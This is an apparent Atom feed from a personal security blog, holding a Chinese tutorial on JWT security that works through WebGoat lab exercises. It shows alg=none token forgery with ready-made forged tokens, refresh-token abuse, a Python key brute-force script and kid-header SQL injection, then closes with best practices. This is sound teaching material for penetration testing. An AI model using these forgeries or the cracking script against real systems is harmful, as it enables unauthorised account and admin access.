<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J3fffff&#39;s Blog</title>
  
  
  <link href="https://j3f5.github.io/atom.xml" rel="self"/>
  
  <link href="https://j3f5.github.io/"/>
  <updated>2023-06-08T06:14:47.000Z</updated>
  <id>https://j3f5.github.io/</id>
  
  <author>
    <name>Jeff</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JWT安全</title>
    <link href="https://j3f5.github.io/articles/2023/06/07/JWT%E5%AE%89%E5%85%A8/"/>
    <id>https://j3f5.github.io/articles/2023/06/07/JWT%E5%AE%89%E5%85%A8/</id>
    <published>2023-06-07T06:14:47.000Z</published>
    <updated>2023-06-08T06:14:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jwt概念"><a class="markdownIt-Anchor" href="#jwt概念"></a> JWT概念</h1><p>JSON Web Token（简称 JWT）是目前最流行的<strong>跨域认证</strong>解决方案。是一种<strong>认证授权机制</strong>。</p><img src="/images/JWT%E5%AE%89%E5%85%A8/JWT%E5%AE%89%E5%85%A8.png" alt="JWT安全" style="zoom:80%;" /><h2 id="组成部分"><a class="markdownIt-Anchor" href="#组成部分"></a> 组成部分</h2><p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230607154004007.png" alt="image-20230607154004007" /></p><p>上面是使用base64编码的。头部和声明 部分都由JSON对象表示。头部 描述了应用于JWT的加密操作，以及JWT的附加属性，可以选择。声明代表一个JSON对象，其成员是JWT所传达的声明。</p><p>我们可以使用这个工具来解密：<a href="https://jwt.io/">https://jwt.io/</a></p><h3 id="头部-header"><a class="markdownIt-Anchor" href="#头部-header"></a> 头部 Header</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;alg&quot;:&quot;HS256&quot;,</span><br><span class="line">&quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>alg</strong></p><blockquote><p>是说明这个JWT 的签名使用的算法的参数，常见值用HS256（默认），HS512 等，也可以为None。HS256表示 HMAC SHA256。</p></blockquote><p><strong>typ</strong></p><blockquote><p>说明这个 token 的类型为 JWT</p></blockquote><h3 id="声明-claims"><a class="markdownIt-Anchor" href="#声明-claims"></a> 声明 Claims</h3><p>令牌包含识别用户的要求，以及服务器满足请求所需的所有其他信息。请注意不要在令牌中存储敏感信息，并始终通过安全通道发送。例如解码得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;exp&quot;: 1416471934,</span><br><span class="line">&quot;user_name&quot;: &quot;user&quot;,</span><br><span class="line">&quot;scope&quot;: [</span><br><span class="line">&quot;read&quot;,</span><br><span class="line">&quot;write&quot;</span><br><span class="line">],</span><br><span class="line">&quot;authorities&quot;: [</span><br><span class="line">&quot;ROLE_ADMIN&quot;,</span><br><span class="line">&quot;ROLE_USER&quot;</span><br><span class="line">],</span><br><span class="line">&quot;jti&quot;: &quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;,</span><br><span class="line">&quot;client_id&quot;: &quot;my-client-with-secret&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>JWT 固定参数有：</strong></p><ul><li>iss：发行人</li><li>exp：到期时间</li><li>sub：主题</li><li>aud：用户</li><li>nbf：在此之前不可用</li><li>iat：发布时间</li><li>jti：JWT ID 用于标识该 JWT</li></ul><h3 id="签名-signature"><a class="markdownIt-Anchor" href="#签名-signature"></a> 签名 Signature</h3><p>每个JWT令牌在发送给客户端之前至少应该被<strong>签名</strong>，如果一个令牌没有被签名，客户端应用程序将能够改变令牌的内容。签名规范在这里定义，你可以使用的具体算法在这里描述。基本上，你使用</p><ul><li>HMAC与SHA-2函数</li><li>数字签名与RSASSA-PKCS1-v1_5/ECDSA/RSASSA-PSS 函数</li></ul><p>来签名令牌。在执行任何其他操作之前验证签名是一个重要的步骤。<strong>【需要密钥！】</strong></p><h2 id="认证与获取jwt令牌"><a class="markdownIt-Anchor" href="#认证与获取jwt令牌"></a> 认证与获取JWT令牌</h2><p><img src="/images/JWT%E5%AE%89%E5%85%A8/jwt_diagram.png" alt="jwt diagram" /></p><p>在这个流程中，你可以看到</p><ol><li>用户用一个用户名和密码登录，认证成功后，服务器会返回。</li><li>服务器创建一个新的令牌并将这个令牌返回给客户端。</li><li>当客户端连续调用服务器时，它在 &quot;授权 &quot;头中附加了新的令牌。</li><li>服务器读取令牌并首先验证签名，验证成功后，服务器使用令牌中的信息来识别用户。</li></ol><h2 id="分类访问access令牌与刷新refresh令牌"><a class="markdownIt-Anchor" href="#分类访问access令牌与刷新refresh令牌"></a> 分类访问(Access)令牌与刷新(Refresh)令牌</h2><p>通常有两种类型的令牌：访问令牌和刷新令牌。访问令牌用于对服务器进行 API 调用。访问令牌的生命周期有限，这就是刷新令牌的用武之地。一旦访问令牌不再有效，就可以向服务器发出请求，以通过出示刷新令牌来获取新的访问令牌。刷新令牌可以过期，但它们的寿命要长得多。</p><p>这解决了用户必须使用其凭据再次进行身份验证的问题。您是否应该使用刷新令牌和访问令牌取决于以下几点，在选择要使用的令牌时要牢记以下几点。</p><ol><li><p>登录获取令牌：<code>curl -X POST -H -d 'username=webgoat&amp;password=webgoat' localhost:8080/WebGoat/login</code></p></li><li><p>服务器返回令牌：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;token_type&quot;:&quot;bearer&quot;,</span><br><span class="line">    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,</span><br><span class="line">    &quot;expires_in&quot;:10,</span><br><span class="line">    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如您所见，<strong>刷新令牌是一个随机字符串</strong>，服务器可以对其进行跟踪（在内存中或存储在数据库中），<strong>以便将刷新令牌与授予刷新令牌的用户相匹配</strong>。因此，在这种情况下，只要访问令牌仍然有效，我们就可以说是“无状态”会话，服务器端设置用户会话没有负担，令牌是自包含的。当访问令牌不再有效时，<strong>服务器需要查询存储的刷新令牌以确保令牌未以任何方式被阻止</strong>。</p></li><li><p><strong>每当攻击者获得访问令牌时，它仅在一定时间内有效（比如 10 分钟）</strong>。然后攻击者需要刷新令牌来获取新的访问令牌。这就是刷新令牌需要更好保护的原因。也可以使刷新令牌无状态，但这意味着将更难查看用户是否撤销了令牌。服务器完成所有验证后，它必须向客户端返回一个新的刷新令牌和一个新的访问令牌。客户端可以使用新的访问令牌进行 API 调用。</p></li></ol><p>无论选择哪种解决方案，您都应该在服务器端存储足够的信息以验证用户是否仍然可信。</p><ul><li><strong>存储 ip 地址</strong></li><li><strong>跟踪使用刷新令牌的次数</strong>（在访问令牌的有效时间窗口内多次使用刷新令牌可能表示奇怪的行为，你可以撤销所有令牌并让用户再次进行身份验证）</li><li><strong>跟踪哪个访问令牌属于哪个刷新令牌</strong>，否则攻击者可能能够使用攻击者的刷新令牌为不同的用户获取新的访问令牌（参见 <a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/</a> 以获得关于此攻击如何工作的精彩文章）</li><li><strong>检查用户的 IP 地址或地理位置</strong>。如果您需要发出新的令牌，请检查位置是否仍然相同，如果不撤销所有令牌并让用户再次进行身份验证。</li></ul><h2 id="jwt的用处"><a class="markdownIt-Anchor" href="#jwt的用处"></a> JWT的用处</h2><p>在现代单页应用程序 (SPA) 中使用刷新令牌是否有意义？正如我们在关于存储令牌的部分中看到的那样，有两种选择：</p><ul><li>Web 存储</li><li>cookie</li></ul><p>这意味着刷新令牌就在访问令牌旁边，因此如果访问令牌泄露，刷新令牌也可能会受到损害。大多数时候当然是有区别的。</p><p>访问令牌在您进行 API 调用时发送，<strong>刷新令牌仅在应获取新访问令牌时发送</strong>，这在大多数情况下是不同的端点。如果您最终在同一台服务器上，您可以选择仅使用访问令牌。</p><p>如上所述，使用访问令牌和单独的刷新令牌为服务器提供了一些杠杆，而不是一遍又一遍地检查访问令牌。仅在用户需要新的访问令牌时执行检查。当然可以只使用访问令牌。在服务器上，您存储的信息与您为刷新令牌存储的信息完全相同，请参阅上一段。这样您每次都需要检查令牌，但这可能适用于不同的应用程序。在存储刷新令牌以进行验证的情况下，保护这些令牌也很重要（至少使用哈希函数将它们存储在数据库中）。</p><p>有很多可用资源质疑使用 JWT 令牌进行客户端到服务器身份验证的用例。<strong>使用 JWT 令牌的最佳位置是服务器到服务器之间的通信</strong>。在普通的 Web 应用程序中，您最好使用普通的旧 cookie。</p><img src="/images/JWT%E5%AE%89%E5%85%A8/jwt-flowchart.png" alt="img" style="zoom:80%;" /><h1 id="伪造签名令牌"><a class="markdownIt-Anchor" href="#伪造签名令牌"></a> 伪造签名令牌</h1><h2 id="伪造access_token攻击"><a class="markdownIt-Anchor" href="#伪造access_token攻击"></a> 伪造access_token攻击</h2><p>截获数据包，发现</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230607161353947.png" alt="image-20230607161353947" style="zoom:67%;" /><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230607161318132.png" alt="image-20230607161318132" style="zoom:67%;" /><p>发现里面有个字段为：admin=false，改成true试试看。但是返回一个：token不正确，要检查。所以可能是签名出问题了，我们改了参数值，同步的签名也要进行更改的，但是我们没有密钥，所以后面的签名没办法更改。我们可以尝试更改头部，让它不用密钥加密就好啦，直接 none 走起！操作如下：</p><ol><li><pre class="hljs"><code class="">&#123;&quot;alg&quot;:&quot;none&quot;&#125;eyJhbGciOiJub25lIn0=<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   &#123;&quot;iat&quot;:1686989890,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Tom&quot;&#125;</span><br><span class="line">   eyJpYXQiOjE2ODY5ODk4OTAsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==</span><br></pre></td></tr></table></figure></code></pre></li></ol><p>但是在HTTP数据传输的过程中，Base64编码中的<code>=+/</code>等特殊的符号通过URL容易产生歧义，所以产生了与URL兼容的Base64 URL编码，所以把<code>=</code>删掉，就构造好了：<code>eyJhbGciOiJub25lIn0.eyJpYXQiOjE2ODY5ODk4OTAsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</code></p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230607165148603.png" alt="image-20230607165148603" style="zoom:50%;" /><h2 id="伪造authorization"><a class="markdownIt-Anchor" href="#伪造authorization"></a> 伪造authorization</h2><p>这个的伪造点在字段：Authorization中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /WebGoat/JWT/refresh/checkout HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Content-Length: 0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;112&quot;, &quot;Google Chrome&quot;;v=&quot;112&quot;, &quot;Not:A-Brand&quot;;v=&quot;99&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Authorization: Bearer null</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>我们有一个JWT token：<code>eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q</code></p><h3 id="第一种更改时间algnone"><a class="markdownIt-Anchor" href="#第一种更改时间algnone"></a> 第一种：更改时间+alg=none</h3><p>分析得到这个token早就过期了，那么我们<strong>重新弄一下这个过期时间</strong>，然后把签名去掉。参考上面的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJub25lIn0.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6IDE2ODYyOTAzMTgsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</span><br></pre></td></tr></table></figure><h3 id="第二种使用refresh-token"><a class="markdownIt-Anchor" href="#第二种使用refresh-token"></a> 第二种：使用refresh token</h3><p>通常，在响应 JWT 身份验证/刷新请求时，你会得到如下所示的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:0,&quot;data&quot;:&#123;&quot;access_token&quot;:&quot;XXX.YYY.ZZZ&quot;,&quot;access_token_expiration&quot;:&quot;Thursday, November 9th, 2017, 10:27:33 PM&quot;,&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>此示例中的访问令牌将于10:27:33过期。通常，应用程序将使用刷新令牌在到期日期之前刷新/获取新的访问令牌。该请求将转到授权服务器，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /auth/refresh HTTP/1.1</span><br><span class="line">Host: auth.example.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Authorization: Bearer XXX.YYY.ZZZ</span><br><span class="line"></span><br><span class="line">&#123;&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;</span><br></pre></td></tr></table></figure><p>当前访问令牌位于授权标头中，刷新令牌位于 POST 正文中。作为回报，您将获得一个全新的访问令牌、到期日期和刷新令牌。则我们伪造：<strong>使用我的刷新令牌刷新其他人的访问令牌</strong></p><p><strong>操作如下：</strong></p><ol><li><p>F12查看流量，搜索：refresh_token，得到：</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608113035376.png" alt="image-20230608113035376" style="zoom:50%;" /></li><li><p>获取这个refresh_token，还有之前tom的token，抓包贴上（改URL，改content-type…），如下，就可刷新我们的token了，我们的token就不怕过期了！（得到URL的方式也很重要）</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608113958918.png" alt="image-20230608113958918" style="zoom:50%;" /><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608113551369-16861953534983.png" alt="image-20230608113551369" style="zoom: 50%;" /></li><li><p>贴上我们刚获得的token，就OK了！</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608113811331.png" alt="image-20230608113811331" style="zoom: 50%;" /></li></ol><h2 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计"></a> 代码审计</h2><h3 id="更改token细节匹配"><a class="markdownIt-Anchor" href="#更改token细节匹配"></a> 更改token细节——匹配</h3><p>对比下面两个代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">   Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken);</span><br><span class="line">   Claims claims = (Claims) jwt.getBody();</span><br><span class="line">   String user = (String) claims.get(&quot;user&quot;);</span><br><span class="line">   boolean isAdmin = Boolean.valueOf((String) claims.get(&quot;admin&quot;));</span><br><span class="line">   if (isAdmin) &#123;</span><br><span class="line">     removeAllUsers();</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">     log.error(&quot;You are not an admin user&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; catch (JwtException e) &#123;</span><br><span class="line">  throw new InvalidTokenException(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">   Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br><span class="line">   Claims claims = (Claims) jwt.getBody();</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>就是第2行代码不一样。主要涉及两个函数：</p><ol><li>parseClaimsJws：</li><li>parse</li></ol><h3 id="refresh-token生成"><a class="markdownIt-Anchor" href="#refresh-token生成"></a> refresh token——生成</h3><p>看到代码存在两个POSTMAPPING：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&#123;&quot;/JWT/refresh/checkout&quot;&#125;)</span><br><span class="line">@PostMapping(&#123;&quot;/JWT/refresh/newToken&quot;&#125;)</span><br></pre></td></tr></table></figure><p>第一个是确认订单的，主要看第二个生成refresh token：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/JWT/refresh/login&quot;&#125;,</span></span><br><span class="line"><span class="meta">    consumes = &#123;&quot;application/json&quot;&#125;,</span></span><br><span class="line"><span class="meta">    produces = &#123;&quot;application/json&quot;&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity <span class="title function_">follow</span><span class="params">(<span class="meta">@RequestBody(required = false)</span> Map&lt;String, Object&gt; json)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (json == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String)json.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> (String)json.get(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Jerry&quot;</span>.equalsIgnoreCase(user) &amp;&amp; <span class="string">&quot;bm5nhSkxCXZkKRy4&quot;</span>.equals(password) ? ResponseEntity.ok(<span class="built_in">this</span>.createNewTokens(user)) : ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> ResponseEntity <span class="title function_">newToken</span><span class="params">(<span class="meta">@RequestHeader(value = &quot;Authorization&quot;,required = false)</span> String token, <span class="meta">@RequestBody(required = false)</span> Map&lt;String, Object&gt; json)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (token != <span class="literal">null</span> &amp;&amp; json != <span class="literal">null</span>) &#123;</span><br><span class="line">            String user;</span><br><span class="line">            String refreshToken;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Jwt&lt;Header, Claims&gt; jwt = Jwts.parser().setSigningKey(<span class="string">&quot;bm5n3SkxCX4kKRy4&quot;</span>).parse(token.replace(<span class="string">&quot;Bearer &quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">                user = (String)((Claims)jwt.getBody()).get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">                refreshToken = (String)json.get(<span class="string">&quot;refresh_token&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ExpiredJwtException var6) &#123;</span><br><span class="line">                user = (String)var6.getClaims().get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">                refreshToken = (String)json.get(<span class="string">&quot;refresh_token&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user != <span class="literal">null</span> &amp;&amp; refreshToken != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (validRefreshTokens.contains(refreshToken)) &#123;</span><br><span class="line">                    validRefreshTokens.remove(refreshToken);</span><br><span class="line">                    <span class="keyword">return</span> ResponseEntity.ok(<span class="built_in">this</span>.createNewTokens(user));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从上面可以看到，我们需要的Username为Jerry，密码是静态的。那么根据responsebody，我们构造请求包，这里知道是json格式：通过checkout的请求包，将conten-type改为json，然后构造参数，即可获得refresh token。</p><p>在/JWT/refresh/newToken接口，首先接收Authorization的值，进行jwt解码，得到user，然后再从json中得到refresh_token，如果refresh_token有效，则刷新access_token。</p><h1 id="密钥爆破攻击"><a class="markdownIt-Anchor" href="#密钥爆破攻击"></a> 密钥爆破攻击</h1><p>相对于上面，如果我们有密钥，那么我们就可以跟着修改签名，重新构造数据包进行攻击。我们可以发起离线的暴力破解发起对密钥的攻击。字典的话需要自己找。具体流程如下：</p><ol><li><p>抓取到JWT token，分析得到如下：</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608093247180.png" alt="image-20230608093247180" style="zoom:50%;" /></li><li><p>将token放到破解脚本里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">alg = <span class="string">&quot;HS256&quot;</span></span><br><span class="line">jwt_str = <span class="string">&quot;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY4NjE4NzUwOCwiZXhwIjoxNjg2MTg3NTY4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.0TkftJKgV9kqnroqC_5QhsJdkxhl7x65m4ZPSA8Qq4M&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pass.txt&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        key_ = line.strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_, algorithms=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found key! --&gt; &#x27;</span> + key_)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError,</span><br><span class="line">               jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">               jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found key! --&gt; &#x27;</span> + key_)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key not found!&quot;</span>)</span><br></pre></td></tr></table></figure><p>找个好一点的字典直接开干</p></li><li><p>破解到之后，<strong>大概率token已经过期了</strong>，所以重新生成（但是密钥应该不会变），重新构造，例如得到密钥：<code>shipping</code></p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608093530949.png" alt="image-20230608093530949" style="zoom:50%;" /></li></ol><h1 id="综合利用"><a class="markdownIt-Anchor" href="#综合利用"></a> 综合利用</h1><h2 id="与sql注入结合"><a class="markdownIt-Anchor" href="#与sql注入结合"></a> 与sql注入结合</h2><p>JWT由这个组成，看到kid不是自带的固定字段，所以可能有设么含义：</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608122654080.png" alt="image-20230608122654080" style="zoom:50%;" /><p>然后看到源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ResultSet rs = connection.createStatement().executeQuery(&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot; + kid + &quot;&#x27;&quot;);</span><br><span class="line">...</span><br><span class="line">var6 = TextCodec.BASE64.decode(rs.getString(1));</span><br></pre></td></tr></table></figure><p>从Header中获取“kid”直接插入sql查询语句中，存在SQL注入，将返回结果进行了base64解码作为KEY，然后进行解析。然后解析后 ，username参数等于”Tom”，则删除。</p><p>参考：<a href="https://www.cnblogs.com/yokan/p/15202333.html">https://www.cnblogs.com/yokan/p/15202333.html</a></p><h2 id="nodejs前端jw登录安全伪造admin"><a class="markdownIt-Anchor" href="#nodejs前端jw登录安全伪造admin"></a> Node.js前端jw登录安全，伪造admin</h2><ol><li><p>注册用户登录，分析：<code>controllers/api.js</code>，看到需要我们伪造用户：admin</p></li><li><p>抓取数据包，进行解密修改后再加密，伪造登录即可</p></li></ol><h1 id="安全使用"><a class="markdownIt-Anchor" href="#安全使用"></a> 安全使用</h1><p>使用 JWT 时的一些最佳实践：</p><ul><li>固定算法，不允许客户端切换算法。</li><li>使用对称密钥对令牌进行签名时，请确保使用适当的密钥长度。</li><li>确保添加到令牌的声明不包含个人信息。如果您需要添加更多信息，也可以选择加密令牌。</li><li>向您的项目添加足够的测试用例以验证无效令牌实际上不起作用。与第三方集成以检查您的令牌并不意味着您根本没有测试您的应用程序。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;jwt概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#jwt概念&quot;&gt;&lt;/a&gt; JWT概念&lt;/h1&gt;
&lt;p&gt;JSON Web Token（简称 JWT）是目前最流行的&lt;strong&gt;跨域认证&lt;/strong&gt;解决方案。是一种&lt;stro</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="JWT" scheme="https://j3f5.github.io/tags/JWT/"/>
    
  </entry>
  
  <entry>
    <title>反序列化漏洞基础</title>
